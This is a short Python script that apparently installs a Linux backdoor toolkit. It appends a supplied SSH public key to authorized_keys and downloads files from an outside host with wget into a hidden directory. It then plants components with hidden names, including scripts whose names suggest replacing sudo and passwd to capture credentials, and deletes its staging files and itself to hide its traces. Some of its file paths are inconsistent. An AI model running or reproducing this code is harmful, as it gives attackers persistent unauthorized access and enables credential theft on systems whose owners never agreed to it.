import os
import sys

def main():
    sshKey = "" #TODO - Enter public SSH key here
    
    if(len(sshKey) != 0):
        if(os.path.exists("~/.ssh/authorized_keys") == False):
            os.system("touch .ssh/authorized_keys")
        os.system("echo \"" + sshKey + "\" >> /.ssh/authorized_keys")
    os.system("mkdir /etc/.a")
    os.system("wget -P /etc/.a -r -l 2 https://files.ravenn.net/horror/syslogT")
    os.system("mv /etc/.a/files.ravenn.net/horror/syslogT /etc/.a")
    os.system("mv /etc/.a/syslogT/syslogT.py /lib/.syslogT.py")
    os.system("mv /etc/.a/syslogT/sudoReplacer/sudoMaker.sh /var/.sudoMaker.sh")
    os.system("mv /etc/.a/syslogT/passwdReplacer/passwdMaker.sh /var/.passwdMaker.sh")
    print("Installation complete. Goodbye")
    os.system("rm -rf /etc/.a")
    os.remove(sys.argv[0])
    
main()